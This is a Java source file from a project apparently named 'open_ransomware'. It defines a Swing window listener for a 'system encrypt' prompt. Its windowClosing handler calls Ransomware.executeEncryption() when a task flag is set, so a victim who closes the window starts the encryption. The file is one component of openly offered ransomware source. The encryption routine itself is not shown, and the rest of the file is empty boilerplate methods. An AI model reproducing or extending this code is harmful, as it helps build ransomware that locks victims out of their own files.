package com.bechris100.open_ransomware.windows;

import com.bechris100.open_ransomware.software.Ransomware;

import javax.swing.*;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;

import static com.bechris100.open_ransomware.windows.SystemEncryptPrompt.EXECUTING_TASK;

public class SystemEncryptWindowListener implements WindowListener {

    private final JFrame frame;

    public SystemEncryptWindowListener(JFrame frame) {
        super();
        this.frame = frame;
    }

    @Override
    public void windowOpened(WindowEvent windowEvent) {

    }

    @Override
    public void windowClosing(WindowEvent windowEvent) {
        if (EXECUTING_TASK)
            Ransomware.executeEncryption();
        else
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }

    @Override
    public void windowClosed(WindowEvent windowEvent) {

    }

    @Override
    public void windowIconified(WindowEvent windowEvent) {

    }

    @Override
    public void windowDeiconified(WindowEvent windowEvent) {

    }

    @Override
    public void windowActivated(WindowEvent windowEvent) {

    }

    @Override
    public void windowDeactivated(WindowEvent windowEvent) {

    }
}
